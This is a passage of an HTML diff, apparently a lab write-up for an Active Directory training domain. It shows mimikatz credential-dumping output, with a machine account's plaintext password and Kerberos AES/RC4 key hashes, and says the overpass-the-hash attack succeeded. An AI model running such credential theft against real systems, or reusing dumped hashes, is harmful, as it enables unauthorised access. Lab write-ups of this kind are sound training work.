+<span class="nx">Logon</span><span class="w"> </span><span class="nx">Server</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="kt">null</span><span class="p">)</span>
+<span class="nx">Logon</span><span class="w"> </span><span class="nx">Time</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="p">/</span><span class="nx">21</span><span class="p">/</span><span class="nx">2024</span><span class="w"> </span><span class="mi">4</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">40</span><span class="w"> </span><span class="nx">AM</span>
+<span class="nx">SID</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="nx">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">96</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">0</span>
+
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nx">Username</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">DCORP</span><span class="na">-MGMT</span><span class="err">$</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nx">Domain</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">dollarcorp.moneycorp.local</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nx">Password</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="o">?</span><span class="nx">PhChKP</span><span class="p">(</span><span class="sb">`?yW`</span><span class="nx">E8</span><span class="o">=</span><span class="nx">VM2QI13O</span><span class="o">!</span><span class="nx">i</span><span class="o">*</span><span class="mi">3</span><span class="nx">Q</span><span class="o">?</span><span class="nx">WVB</span><span class="s2">&quot;X)=&gt;Il3=AczJ0^T!X]r&amp;:&amp;yG41`*/$^4+EeZ07?zF2Z3`:[Jd*F/z_P`p6B9XH^g$*mXIQMXY(Sc?3</span><span class="se">\A</span><span class="s2">6ICrX</span>
+<span class="s2">         * Key List :</span>
+<span class="s2">           aes256_hmac       c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076</span>
+<span class="s2">           aes128_hmac       b3b9f96ed137fb4c079dcfe2e23f7854</span>
+<span class="s2">           rc4_hmac_nt       0878da540f45b31b974f73312c18e754</span>
+<span class="s2">           rc4_hmac_old      0878da540f45b31b974f73312c18e754</span>
+<span class="s2">           rc4_md4           0878da540f45b31b974f73312c18e754</span>
+<span class="s2">           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754</span>
+<span class="s2">           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754</span>
+
+<span class="s2">Authentication Id : 0 ; 21244 (00000000:000052fc)</span>
+<span class="s2">Session           : Interactive from 1</span>
+<span class="s2">User Name         : UMFD-1</span>
+<span class="s2">Domain            : Font Driver Host</span>
+<span class="s2">Logon Server      : (null)</span>
+<span class="s2">Logon Time        : 2/21/2024 4:07:40 AM</span>
+<span class="s2">SID               : S-1-5-96-0-1</span>
+
+<span class="s2">         * Username : DCORP-MGMT$</span>
+<span class="s2">         * Domain   : dollarcorp.moneycorp.local</span>
+<span class="s2">         * Password : 4?PhChKP(`?yW`E8=VM2QI13O!i*3Q?WVB&quot;</span><span class="nx">X</span><span class="p">)</span><span class="o">=&gt;</span><span class="nx">Il3</span><span class="o">=</span><span class="nx">AczJ0</span><span class="p">^</span><span class="nx">T</span><span class="o">!</span><span class="nx">X</span><span class="cp">]</span><span class="nd">r</span><span class="o">&amp;:&amp;</span><span class="nt">yG41</span><span class="err">`</span><span class="o">*/$^</span><span class="nt">4</span><span class="o">+</span><span class="nt">EeZ07</span><span class="o">?</span><span class="nt">zF2Z3</span><span class="err">`</span><span class="o">:</span><span class="cp">[</span><span class="nx">Jd</span><span class="o">*</span><span class="nx">F</span><span class="p">/</span><span class="nx">z_P</span><span class="err">`</span><span class="nx">p6B9XH</span><span class="p">^</span><span class="nx">g</span><span class="err">$</span><span class="o">*</span><span class="nx">mXIQMXY</span><span class="p">(</span><span class="nx">Sc</span><span class="o">?</span><span class="mi">3</span><span class="o">\</span><span class="nx">A6ICrX</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nx">Key</span><span class="w"> </span><span class="kt">List</span><span class="w"> </span><span class="p">:</span>
+<span class="w">           </span><span class="nx">aes256_hmac</span><span class="w">       </span><span class="nx">c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076</span>
+<span class="w">           </span><span class="nx">aes128_hmac</span><span class="w">       </span><span class="nx">b3b9f96ed137fb4c079dcfe2e23f7854</span>
+<span class="w">           </span><span class="nx">rc4_hmac_nt</span><span class="w">       </span><span class="mi">0878</span><span class="nx">da540f45b31b974f73312c18e754</span>
+<span class="w">           </span><span class="nx">rc4_hmac_old</span><span class="w">      </span><span class="mi">0878</span><span class="nx">da540f45b31b974f73312c18e754</span>
+<span class="w">           </span><span class="nx">rc4_md4</span><span class="w">           </span><span class="mi">0878</span><span class="nx">da540f45b31b974f73312c18e754</span>
+<span class="w">           </span><span class="nx">rc4_hmac_nt_exp</span><span class="w">   </span><span class="mi">0878</span><span class="nx">da540f45b31b974f73312c18e754</span>
+<span class="w">           </span><span class="nx">rc4_hmac_old_exp</span><span class="w">  </span><span class="mi">0878</span><span class="nx">da540f45b31b974f73312c18e754</span>
+
+<span class="nx">Authentication</span><span class="w"> </span><span class="nx">Id</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="mi">999</span><span class="w"> </span><span class="p">(</span><span class="mi">00000000</span><span class="p">:</span><span class="mi">000003</span><span class="nx">e7</span><span class="p">)</span>
+<span class="nx">Session</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">UndefinedLogonType</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="mi">0</span>
+<span class="nx">User</span><span class="w"> </span><span class="nx">Name</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">DCORP</span><span class="na">-MGMT</span><span class="err">$</span>
+<span class="nx">Domain</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">dcorp</span>
+<span class="nx">Logon</span><span class="w"> </span><span class="nx">Server</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="kt">null</span><span class="p">)</span>
+<span class="nx">Logon</span><span class="w"> </span><span class="nx">Time</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="p">/</span><span class="nx">21</span><span class="p">/</span><span class="nx">2024</span><span class="w"> </span><span class="mi">4</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">39</span><span class="w"> </span><span class="nx">AM</span>
+<span class="nx">SID</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="nx">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">18</span>
+
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nx">Username</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">dcorp</span><span class="na">-mgmt</span><span class="err">$</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nx">Domain</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">DOLLARCORP.MONEYCORP.LOCAL</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nx">Password</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="kt">null</span><span class="p">)</span>
+<span class="w">         </span><span class="o">*</span><span class="w"> </span><span class="nx">Key</span><span class="w"> </span><span class="kt">List</span><span class="w"> </span><span class="p">:</span>
+<span class="w">           </span><span class="nx">aes256_hmac</span><span class="w">       </span><span class="nx">b607d794f87ca117a14353da0dbb6f27bbe9fed4f1ce1b810b43fbb9a2eab192</span>
+<span class="w">           </span><span class="nx">rc4_hmac_nt</span><span class="w">       </span><span class="mi">0878</span><span class="nx">da540f45b31b974f73312c18e754</span>
+<span class="w">           </span><span class="nx">rc4_hmac_old</span><span class="w">      </span><span class="mi">0878</span><span class="nx">da540f45b31b974f73312c18e754</span>
+<span class="w">           </span><span class="nx">rc4_md4</span><span class="w">           </span><span class="mi">0878</span><span class="nx">da540f45b31b974f73312c18e754</span>
+<span class="w">           </span><span class="nx">rc4_hmac_nt_exp</span><span class="w">   </span><span class="mi">0878</span><span class="nx">da540f45b31b974f73312c18e754</span>
+<span class="w">           </span><span class="nx">rc4_hmac_old_exp</span><span class="w">  </span><span class="mi">0878</span><span class="nx">da540f45b31b974f73312c18e754</span>
+
+<span class="nx">mimikatz</span><span class="p">(</span><span class="nx">commandline</span><span class="p">)</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="nx">exit</span>
+<span class="nx">Bye</span><span class="o">!</span>
+</code></pre></div>
+
+<p>As we can see above our OverPass The Hash worked fine and we were able to get credentials.</p>
+          </div>
+        </section>
+      </article>
+    </div>
+  </main>
+
+  <script src="../../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
